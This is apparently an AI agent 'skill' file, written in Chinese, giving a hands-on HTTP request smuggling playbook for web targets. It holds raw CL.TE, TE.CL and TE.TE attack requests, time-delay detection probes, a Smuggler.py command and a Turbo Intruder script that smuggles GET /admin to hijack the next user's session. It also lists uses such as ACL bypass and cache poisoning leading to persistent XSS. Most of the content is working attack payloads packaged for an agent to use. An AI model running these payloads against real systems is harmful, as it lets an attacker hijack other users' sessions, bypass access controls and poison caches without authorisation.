---
name: 'http-request-smuggling'
description: 'HTTP Request Smuggling 完整实战（修正版）：CL.TE/TE.CL/TE.TE检测、时间延迟、Turbo Intruder（CL已修正）、踩坑表'
disable-model-invocation: true
metadata: { domain: web, tier: T2 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

## HTTP Request Smuggling / HTTP Desync Attack

### 原理
前端（代理/CDN/负载均衡）和后端对 HTTP 请求边界解析不一致 → 攻击者发送一个请求，前端看作一个，后端看作两个 → 第二个"走私"请求可以劫持下一用户的请求、绕过 ACL、窃取 session。

### ⚠️ 关键前提
- 前后端通信必须用 **HTTP/1.1 keep-alive**（复用 TCP 连接），否则无法走私
- 使用 `Connection: keep-alive` 确保连接不关闭
- Burp Repeater 中**必须关闭** `Update Content-Length` 和 `Normalize HTTP/1 line endings`

---

### 核心类型

#### CL.TE（前端 Content-Length，后端 Transfer-Encoding）
```http
POST / HTTP/1.1
Host: target.com
Connection: keep-alive
Content-Length: 6
Transfer-Encoding: chunked

0

G
```
- `0\r\n\r\nG` = 6 bytes（0=1, CRLF=2, CRLF=2, G=1）
- 前端 CL=6 → 全部转发
- 后端 TE → `0\r\n\r\n` 结束请求，`G` 成为下一个请求的开头

#### TE.CL（前端 TE，后端 CL）
```http
POST / HTTP/1.1
Host: target.com
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Length: 15

x=1
0


```
- 前端 TE → 全部转发
- 后端 CL=4 → 只读 `5c\r\n`（4字节），剩余成为下一个请求

#### TE.TE（Obfuscation）
两者都支持 TE，但通过对 header 做混淆使其中一个忽略它：
```http
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

---

### 检测方法

#### 时间延迟检测（最可靠，不需要猜测参数）

**CL.TE 检测** — 前端 CL 截断，后端 TE 等 chunk 永不完整 → 超时：
```http
POST / HTTP/1.1
Host: target.com
Connection: keep-alive
Transfer-Encoding: chunked
Content-Length: 4

1
A
0


```

**TE.CL 检测** — 后端 CL 等更多字节 → 超时：
```http
POST / HTTP/1.1
Host: target.com
Connection: keep-alive
Transfer-Encoding: chunked
Content-Length: 6

0
X
```

#### 差异响应检测
发送两个版本，其中一个走私请求到受限端点 → 如果返回不同（如 403 vs 200）→ 确认。

---

### 工具
| 工具 | 方式 | 场景 |
|------|------|------|
| **Burp HTTP Request Smuggler** | BApp Store 扩展 | 右键 → Launch Smuggle probe |
| **Smuggler.py** (defparam/smuggler) | Python CLI | 无 Burp 时 |
| **smugglefuzz** (Moopinger) | 批量 fuzz | 大规模检测 |

```bash
# Smuggler 基本用法
python3 smuggler.py -u https://target.com -t 10
```

---

### Turbo Intruder 脚本（CL.TE Session Hijack）
```python
import time

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=5,
        engine=Engine.THREADED,
    )
    engine.start()

    # ⚠️ Content-Length 需与 body 字节数精确匹配！
    # body: 0\r\n\r\nGET /admin HTTP/1.1\r\nX-Foo: k = 32 bytes
    attack = '''POST / HTTP/1.1
Host: target.com
Connection: keep-alive
Transfer-Encoding: chunked
Content-Length: 32

0

GET /admin HTTP/1.1
X-Foo: k'''

    engine.queue(attack)

    # 发送正常请求触发回显
    for i in range(14):
        engine.queue('GET / HTTP/1.1\r\nHost: target.com\r\n\r\n')
        time.sleep(0.05)

def handleResponse(req, interesting):
    table.add(req)
```

---

### 利用场景
1. **Session Hijack** — 走私 `GET /admin` → 后端把下一用户的真实请求拼接到走私请求后面 → admin 响应回显给攻击者
2. **ACL Bypass** — 走私到 `/admin` 等需要特定 IP 的端点 → 后端看到连接来自前端（信任的代理 IP）
3. **Cache Poisoning** — 走私 redirect → 静态资源缓存被替换 → 持久 XSS
4. **Response Queue Poisoning** — 多连接时后端的响应队列被打乱

---

### 🔴 常见踩坑

| 问题 | 原因 | 解决 |
|------|------|------|
| 走私不生效 | Connection 不是 keep-alive | 加 `Connection: keep-alive` |
| Content-Length 对不上 | 改了 body 没重算 | 算精确字节数（CRLF=\r\n=2 bytes） |
| Burp 自动改 CL | `Update Content-Length` 开着 | Repeater 菜单里关掉 |
| \r\n 被标准化 | `Normalize HTTP/1 line endings` | 关掉 |
| 后端不解析 TE | 后端用 HTTP/1.0 或不支持 chunked | 试 CL.0 或 TE.0 变体 |

### 关键指标
- 响应中 `Server` header 在不同请求中不一致 → 两个不同服务器在处理
- 时间延迟差异 → 前后端等待行为不同
- 技术栈：HAProxy→Gunicorn, ALB→IIS, Nginx→uWSGI, Varnish→Apache
